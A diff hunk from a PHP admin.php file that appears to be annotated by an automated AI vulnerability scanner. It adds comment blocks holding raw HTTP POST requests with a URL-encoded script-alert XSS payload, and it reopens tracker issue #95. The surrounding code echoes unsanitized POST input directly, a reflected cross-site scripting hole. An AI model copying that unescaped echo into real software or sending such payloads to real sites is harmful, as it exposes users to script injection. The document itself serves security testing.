@@ -77,7 +77,16 @@ if (isset($_POST))
     //
     //e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
     echo $_POST['e'];
-    //VERIFY: AI XSS issue #95, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/95, 16ac0e66
+    //AI exploit:
+    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c034210/admin.php HTTP/1.1
+    //Host: localhost
+    //Accept-Encoding: identity
+    //Connection: close
+    //Content-Type: application/x-www-form-urlencoded
+    //Content-Length: 41
+    //
+    //f=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+    //REOPEN: AI XSS issue #95, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/95, 16ac0e66
     //AI exploit:
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-07589d2/admin.php HTTP/1.1
     //Host: localhost
